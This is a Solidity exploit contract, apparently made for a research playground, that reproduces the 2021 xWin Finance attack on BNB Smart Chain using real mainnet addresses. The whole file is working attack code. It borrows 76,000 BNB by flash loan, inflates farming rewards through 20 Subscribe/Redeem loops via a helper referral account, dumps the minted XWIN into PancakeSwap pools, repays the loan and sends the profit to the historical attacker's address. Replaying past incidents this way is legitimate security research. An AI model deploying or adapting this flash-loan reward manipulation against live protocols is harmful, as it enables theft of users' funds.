// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-06-xWin).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test harness
// (XWinExpTest): it borrows 76,000 BNB from xWin's own Bank via flashloan(),
// receives the funds in its `executeOperation` callback, inflates a farming
// reward through 20 Subscribe/redeem loops against a thin XWIN/WBNB pool,
// mints ~303,998 XWIN out of thin air, dumps it into a deeper XWIN/WBNB pool,
// and repays the flash loan — netting ~842.49 BNB. The flashloan callback and
// the helper `SimpleAccount` both live on the test contract, so there is no
// standalone exploit contract to deploy.
//
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit + executeOperation + redeem + getAmountOut + SimpleAccount),
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/xWin_exp.sol. No imports — it compiles anywhere.

struct TradeParams {
    address xFundAddress;
    uint256 amount;
    uint256 priceImpactTolerance;
    uint256 deadline;
    bool returnInBase;
    address referral;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
}

interface IxWinDefi {
    function Subscribe(TradeParams memory _tradeParams) external payable;
    function Redeem(TradeParams memory _tradeParams) external payable;
    function WithdrawReward() external payable;
}

interface IBank {
    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

// Minimal helper that mirrors the test's `SimpleAccount`: a fresh contract the
// exploit deploys, seeds with 11 wei of BNB, calls subscribe() on once to prime
// the xWin reward record (referral slot), and finally withdrawRewards() to
// harvest the inflated XWIN reward.
contract SimpleAccount {
    IxWinDefi private constant xWinDefi = IxWinDefi(0x1Bf7fe7568211ecfF68B6bC7CCAd31eCd8fe8092);
    IERC20 private constant PCLPXWIN = IERC20(0x8f52e0C41164169818C1FB04B263FDC7c1e56088);
    IERC20 private constant XWIN = IERC20(0xd88ca08d8eec1E9E09562213Ae83A7853ebB5d28);

    address private owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {}

    function subscribe() public {
        require(msg.sender == owner, "only owner");
        uint256 bnbbalance = address(this).balance;
        TradeParams memory tradeParams = TradeParams({
            xFundAddress: address(PCLPXWIN),
            amount: bnbbalance,
            priceImpactTolerance: 10_000,
            deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,
            returnInBase: false,
            referral: 0x0000000000000000000000000000000000000000
        });
        xWinDefi.Subscribe{value: 11}(tradeParams);
    }

    function withdrawRewards() external {
        require(msg.sender == owner, "only owner");
        xWinDefi.WithdrawReward();
        XWIN.transfer(address(owner), XWIN.balanceOf(address(this)));
    }
}

contract xWinDrain {
    // --- mainnet constants (BSC, fork block 8,589,725) ---
    IBank private constant bank = IBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
    IxWinDefi private constant xWinDefi = IxWinDefi(0x1Bf7fe7568211ecfF68B6bC7CCAd31eCd8fe8092);
    IPancakePair private constant xwinwbnbpair = IPancakePair(0x2D74b7DbF2835aCadd8d4eF75B841c01E1a68383);
    IPancakePair private constant xwinwbnbpair2 = IPancakePair(0xD4A3Dcf47887636B19eD1b54AAb722Bd620e5fb4);
    IERC20 private constant XWIN = IERC20(0xd88ca08d8eec1E9E09562213Ae83A7853ebB5d28);
    IWBNB private constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant PCLPXWIN = IERC20(0x8f52e0C41164169818C1FB04B263FDC7c1e56088);

    // xWin Bank's BNB sentinel token (its flash-loan asset).
    address private constant BNB_TOKEN = 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB;
    // xWin Bank's repay address (the vault that takes principal+fee back).
    address payable private constant repayAddr = payable(0xc78248D676DeBB4597e88071D3d889eCA70E5469);

    // 76,000 BNB flash loan (the exact figure the attack borrows).
    uint256 private constant FLASH_AMOUNT = 76_000_000_000_000_000_000_000;

    // Where the final BNB profit is forwarded (the historical attacker EOA).
    address payable private constant ATTACKER = payable(0xB63F0D8B9aA0c4E68D5630F54BFeFC6Cf2C2AD19);

    constructor() {}

    fallback() external payable {}

    // entrypoint: borrow 76,000 BNB; the callback does the drain and repays.
    function run() external {
        bank.flashloan(address(this), BNB_TOKEN, FLASH_AMOUNT, "");
    }

    // Bank's flash-loan callback — copied verbatim from executeOperation.
    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
        require(address(this).balance == FLASH_AMOUNT, "error");
        SimpleAccount account1 = new SimpleAccount();
        payable(address(account1)).call{value: 11}("");
        account1.subscribe();
        for (uint256 i = 0; i < 20; i++) {
            uint256 bnbbalance = address(this).balance;
            TradeParams memory tradeParams = TradeParams({
                xFundAddress: address(PCLPXWIN),
                amount: bnbbalance,
                priceImpactTolerance: 10_000,
                deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,
                returnInBase: false,
                referral: address(account1)
            });
            xWinDefi.Subscribe{value: bnbbalance}(tradeParams);

            (uint112 reserve0, uint112 reserve1,) = xwinwbnbpair.getReserves();
            uint256 xwinbalance = XWIN.balanceOf(address(this));
            uint256 wbnbout = getAmountOut(xwinbalance, reserve1, reserve0);
            XWIN.transfer(address(xwinwbnbpair), xwinbalance);

            xwinwbnbpair.swap(wbnbout, 0, address(this), "");
            WBNB.withdraw(WBNB.balanceOf(address(this)));
            redeem();
        }

        account1.withdrawRewards();
        uint256 xwinbalance = XWIN.balanceOf(address(this));
        (uint112 reserve0b, uint112 reserve1b,) = xwinwbnbpair2.getReserves();
        uint256 wbnbout = getAmountOut(xwinbalance, reserve1b, reserve0b);
        XWIN.transfer(address(xwinwbnbpair2), xwinbalance);
        xwinwbnbpair2.swap(wbnbout, 0, address(this), "");

        require(WBNB.balanceOf(address(this)) > fee, "must great than fee");
        WBNB.withdraw(WBNB.balanceOf(address(this)));

        payable(repayAddr).call{value: amount + fee}("");

        // forward the net profit to the attacker EOA
        ATTACKER.transfer(address(this).balance);
    }

    function redeem() public payable {
        PCLPXWIN.approve(
            address(xWinDefi), 1_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000
        );
        uint256 pclpxwinbalance = PCLPXWIN.balanceOf(address(this));
        TradeParams memory tradeParams = TradeParams({
            xFundAddress: address(PCLPXWIN),
            amount: pclpxwinbalance,
            priceImpactTolerance: 10_000,
            deadline: 10_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000,
            returnInBase: false,
            referral: 0x0000000000000000000000000000000000000000
        });
        xWinDefi.Redeem(tradeParams);
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "PancakeLibrary: INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn * (10_000 - 25);
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 10_000 + amountInWithFee;
        amountOut = numerator / denominator;
    }
}
